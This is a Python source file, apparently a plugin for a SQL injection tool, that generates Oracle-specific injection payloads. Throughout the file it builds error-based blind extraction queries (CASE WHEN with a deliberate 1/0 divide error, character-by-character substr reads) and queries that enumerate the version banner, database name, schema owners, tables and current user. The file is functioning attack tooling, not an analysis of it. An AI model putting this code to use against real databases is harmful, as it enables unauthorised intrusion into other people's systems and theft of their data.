#-*- coding:utf-8 -*-

from ..core.plugin import *
from ..core.forge import SQLForge

class OracleForge(SQLForge):
	def __init__(self, context):
		SQLForge.__init__(self, context)	
	
	def mid_check(self):
		return self.wrapSQL('SELECT CASE WHEN 1<0 THEN 0 ELSE 1/0 END FROM dual')

	def mid_check_bis(self):
		return self.wrapSQL('SELECT CASE WHEN 0<1 THEN 0 ELSE 1/0 END FROM dual')

	def string_len(self,s):
		return 'LENGTH(%s)'%s
		
	def get_char(self, string, pos):
		return 'substr(%s, %d, 1)' % (string, pos)

	def wrap_bisec(self, cdt):
		return self.wrapSQL('SELECT CASE WHEN %s THEN %s ELSE 1/0 END FROM dual' % (cdt,self.wrapField('0')))

	def count(self, records):
		sql= "SELECT COUNT(*) FROM %s" % records
		return sql

	def take(self, records, index):
		return 'select * FROM %s WHERE ROWNUM=%d' % (records, index)

    ############################################
	# VERSION
	############################################


	def get_version(self):
		return '(SELECT banner FROM v$version WHERE banner LIKE \'Oracle%\')'


	############################################
	# DATABASES
	############################################

	def get_current_database(self):
		return '(SELECT SYS.DATABASE_NAME FROM DUAL)'

	def get_databases(self):
		return '(SELECT DISTINCT owner FROM all_tables)'

	############################################
	# TABLES
	############################################

	def get_tables(self,db):
		return '(SELECT table_name FROM sys.user_tables)'

	############################################
	# USER
	############################################

	def get_user(self):
		return '(SELECT user FROM dual)'

@plugin('oracle','Oracle')
@allow(DBS_ENUM | TABLES_ENUM | COLS_ENUM | FIELDS_ENUM | COMMENT | STR)
class Oracle(Plugin):	
	def __init__(self, injector, limit_count_max=500):
		Plugin.__init__(self, OracleForge, injector, limit_count_max)
		
